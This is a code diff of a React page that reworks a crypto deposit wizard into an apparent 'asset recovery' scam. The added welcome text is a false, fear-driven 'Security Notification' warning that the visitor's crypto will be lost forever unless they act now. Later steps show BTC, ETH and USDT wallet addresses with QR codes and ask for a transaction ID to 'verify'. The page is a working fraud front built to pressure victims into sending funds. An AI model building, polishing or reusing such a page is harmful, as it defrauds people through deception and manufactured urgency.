@@ -4,51 +4,92 @@ import { useState, useEffect } from "react";
 import {
   FaBars,
   FaTimes,
-  FaWallet,
-  FaCoins,
-  FaExchangeAlt,
+  FaBtc,
+  FaEthereum,
   FaCheck,
+  FaRegWindowClose,
 } from "react-icons/fa";
+import { SiTether } from "react-icons/si";
+import { validateTransaction } from "./actions";
 
 export default function Home() {
   const [currentStep, setCurrentStep] = useState(1);
-  const [email, setEmail] = useState("");
   const [txId, setTxId] = useState("");
   const [isMenuOpen, setIsMenuOpen] = useState(false);
   const [showCopiedDialog, setShowCopiedDialog] = useState(false);
   const [showTxDialog, setShowTxDialog] = useState(false);
   const toggleMenu = () => setIsMenuOpen(!isMenuOpen);
+  const [showQrModal, setShowQrModal] = useState(false);
+  const [selectedQrImage, setSelectedQrImage] = useState("");
+  const [selectedCurrency, setSelectedCurrency] = useState<number | null>(null);
+  const [toastMessage, setToastMessage] = useState("");
+  const [showToast, setShowToast] = useState(false);
 
   const wallets = [
     {
       name: "BTC Deposit",
-      icon: <FaWallet className="text-2xl" />,
-      address: "0x4D3d5CA8bB3C9f4EdE2C5E20F2D3dF3bB3C9f4Ed",
+      currency: "BTC",
+      icon: <FaBtc />,
+      address: "1Q2TWHE3GMdB6BZKafqwxXtWAWgFt5Jvm3",//f4184fc596403b9d638783cf57adfe4c75c605f6356fbc91338530e9831e9e16
+      imagePath: "download.png",
+      regex: /^[a-fA-F0-9]{64}$/,
     },
     {
       name: "ETH Deposit",
-      icon: <FaCoins className="text-2xl" />,
-      address: "0x9A8E7fE2E4D3d5CA8bB3C9f4EdE2C5E20F2D3dF3",
+      currency: "ETH",
+      icon: <FaEthereum />,
+      address: "51981370e2ca51bc8ff6fa96f3c272e1cfb00bc9",//0x2e395dc89170411d10632fa02632676a69545e8de2198af4fddb127efbcbd335
+      imagePath: "download.png",
+      regex: /^0x[a-fA-F0-9]{64}$/,
     },
     {
       name: "USDT Deposit",
-      icon: <FaExchangeAlt className="text-2xl" />,
-      address: "bnb1tq9d4p357d4p357d4p357d4p357d4p357d9qk",
+      currency: "USDT",
+      icon: <SiTether />,
+      address: "bnb1tq9d4p357d4p357d4p357d4p357d4p357d9qk",//f98f1efaae7b242eb57bf05d1ef903b0e66f8427c9891a70105581bf16a0d82a
+      imagePath: "download.png",
+      regex: /^[A-Za-z0-9]{64}$/,
     },
   ];
+
+  const closeTaost = () => {
+    setShowToast(false);
+  };
 
   const copyToClipboard = (address: string) => {
     navigator.clipboard.writeText(address);
     setShowCopiedDialog(true);
-    setTimeout(() => setShowCopiedDialog(false), 2000);
+    setTimeout(() => setShowCopiedDialog(false), 1000);
   };
 
-  const handleCheckTx = () => {
-    setShowTxDialog(true);
-    setTimeout(() => {
-      setShowTxDialog(false);
-      setCurrentStep(4);
-    }, 2000);
+  const handleCheckTx = async (e: React.FormEvent) => {
+    e.preventDefault();
+
+    if (selectedCurrency === null) {
+      setToastMessage("Please select a currency");
+      setShowToast(true);
+      return;
+    }
+
+    const selectedWallet = wallets[selectedCurrency];
+
+    const result = await validateTransaction(
+      txId,
+      selectedWallet.currency,
+      selectedWallet.address,
+      selectedWallet.regex
+    );
+
+    if (result.valid) {
+      setShowTxDialog(true);
+      setTimeout(() => {
+        setShowTxDialog(false);
+        setCurrentStep(4);
+      }, 2000);
+    } else {
+      setToastMessage(result.error || result.message || "Verification failed");
+      setShowToast(true);
+    }
   };
 
   return (
@@ -161,32 +202,49 @@ export default function Home() {
 
       {/* Main Content */}
       <div className="flex items-center justify-center min-h-screen pt-20 p-8">
-        <div className="w-full max-w-md p-8 rounded-xl bg-[#181a20] shadow-xl transition-all duration-300 transform">
+        <div className="w-full max-w-lg p-8 rounded-xl bg-[#181a20] shadow-xl transition-all duration-300 transform">
           {currentStep === 1 && (
             <div className="animate-slide-up">
               <h2 className="text-2xl text-white font-semibold mb-6">
                 Welcome!
               </h2>
-                <div>
-                  <h5 className="text-md text-white mb-2">
-                    1 - Go to next step!
-                  </h5>
-                  <h5 className="text-md text-white mb-2">
-                    2 - Choose a wallet address and do transaction
-                  </h5>
-                  <h5 className="text-md text-white mb-2">
-                    3 - write your txId in form and check it
-                  </h5>
-                  <h5 className="text-md text-white mb-2">
-                    4 - everything is good now!
-                  </h5>
-                </div>
-                <button
-                  onClick={() => setCurrentStep(2)}
-                  className="w-full bg-[#f2c118] text-black p-3 rounded-lg hover:bg-[#d1a10f] transition-colors"
-                >
-                  Next
-                </button>
+              <div>
+                <p className="text-md text-white mb-2">
+                  🚨 Security Notification: Immediate Action Required! 🚨
+                  <br></br>
+                  <br></br>
+                  ⚠️ Important: Recover Your Crypto Assets Now! ⚠️
+                  <br></br>
+                  <br></br>
+                  You are currently in the asset recovery process. If you do not
+                  complete all the required steps in this wizard, your crypto
+                  assets will be permanently lost and cannot be recovered later.
+                  <br></br>
+                  <br></br>✅ Follow the instructions carefully to ensure your
+                  funds are safely restored.
+                  <br></br>
+                  <br></br>
+                  🚀 Take action now—this is your only chance to recover your
+                  assets!
+                  <br></br>
+                  <br></br>
+                  🔒 For security reasons, once this process is exited or
+                  skipped, recovery will no longer be possible.
+                  <br></br>
+                  <br></br>
+                  ⚠️ Failure to complete this process means your assets will be
+                  lost forever.
+                  <br></br>
+                  <br></br>
+                  👉 Click "Next" to continue and secure your funds.
+                </p>
+              </div>
+              <button
+                onClick={() => setCurrentStep(2)}
+                className="w-full bg-[#f2c118] text-black p-3 rounded-lg hover:bg-[#d1a10f] transition-colors mt-4"
+              >
+                Next
+              </button>
             </div>
           )}
 
@@ -199,15 +257,36 @@ export default function Home() {
                 {wallets.map((wallet) => (
                   <div
                     key={wallet.name}
-                    onClick={() => copyToClipboard(wallet.address)}
-                    className="flex items-center p-4 rounded-lg bg-[#2b2f36] hover:bg-[#3d424a] cursor-pointer transition-colors"
+                    className="grid grid-cols-12 items-center"
                   >
-                    <span className="text-[#f2c118] mr-3">{wallet.icon}</span>
-                    <div className="text-white">
-                      <div className="font-medium">{wallet.name}</div>
-                      <div className="text-sm text-gray-400">
-                        {wallet.address}
+                    <div
+                      onClick={() => copyToClipboard(wallet.address)}
+                      className="col-span-10 flex items-center justify-evenly p-3 rounded-lg bg-[#2b2f36] hover:bg-[#3d424a] cursor-pointer transition-colors"
+                    >
+                      <span className="text-[#f2c118] mr-3 text-3xl">
+                        {wallet.icon}
+                      </span>
+                      <div className="inline-grid">
+                        <h4 className="text-white font-medium">
+                          {wallet.name}
+                        </h4>
+                        <p className="text-sm text-gray-400 truncate">
+                          {wallet.address}
+                        </p>
                       </div>
+                    </div>
+                    <div
+                      className="col-span-2 ml-2 cursor-pointer"
+                      onClick={() => {
+                        setSelectedQrImage(wallet.imagePath);
+                        setShowQrModal(true);
+                      }}
+                    >
+                      <img
+                        src={wallet.imagePath}
+                        alt="QR Code"
+                        className="object-contain hover:scale-110 transition-transform"
+                      />
                     </div>
                   </div>
                 ))}
@@ -226,7 +305,29 @@ export default function Home() {
               <h2 className="text-2xl text-white font-semibold mb-6">
                 Verify Transaction
               </h2>
-              <div className="space-y-6">
+              <form onSubmit={handleCheckTx} className="space-y-6">
+                <div className="flex gap-4">
+                  <select
+                    value={selectedCurrency ?? ""}
+                    onChange={(e) =>
+                      setSelectedCurrency(Number(e.target.value))
+                    }
+                    className="flex-1 p-3 rounded-md bg-[#2b2f36] text-white border border-[#666]"
+                    required
+                  >
+                    <option value="">Select Currency</option>
+                    {wallets.map((wallet, index) => (
+                      <option key={wallet.name} value={index}>
+                        {wallet.name}
+                      </option>
+                    ))}
+                  </select>
+                  {selectedCurrency !== null && (
+                    <span className="text-[#f2c118] text-4xl p-3">
+                      {wallets[selectedCurrency].icon}
+                    </span>
+                  )}
+                </div>
                 <div>
                   <h5 className="text-sm text-white mb-2">Transaction ID</h5>
                   <input
@@ -239,12 +340,12 @@ export default function Home() {
                   />
                 </div>
                 <button
-                  onClick={handleCheckTx}
+                  type="submit"
                   className="w-full bg-[#f2c118] text-black p-3 rounded-lg hover:bg-[#d1a10f] transition-colors"
                 >
                   Verify
                 </button>
-              </div>
+              </form>
             </div>
           )}
 
@@ -282,18 +383,40 @@ export default function Home() {
         </div>
       )}
 
-      {/* <div className=""
-        style={{
-          width: "60px",
-          height: "60px",
-          background: "#f2c118",
-          position: "absolute",
-          right: "10px",
-          bottom: "10px",
-        }}
-      >
-        asdasd
-      </div> */}
+      {showQrModal && (
+        <div
+          className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50"
+          onClick={() => {
+            setShowQrModal(false);
+            setSelectedQrImage("");
+          }}
+        >
+          <div className="bg-[#2b2f36] p-8 rounded-xl max-w-90vw max-h-90vh">
+            <img
+              src={selectedQrImage}
+              alt="Full Size QR Code"
+              className="w-64 h-64 object-contain mx-auto"
+            />
+            <p className="text-white text-center mt-4 text-sm">
+              Click anywhere to close
+            </p>
+          </div>
+        </div>
+      )}
+
+      {showToast && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+          <div className="bg-red-500 rounded-lg text-white animate-pop-in text-lg relative p-12">
+            <span
+              onClick={closeTaost}
+              className="text-3xl absolute text-white top-2 right-2 cursor-pointer"
+            >
+              <FaRegWindowClose />
+            </span>
+            <p>{toastMessage}</p>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
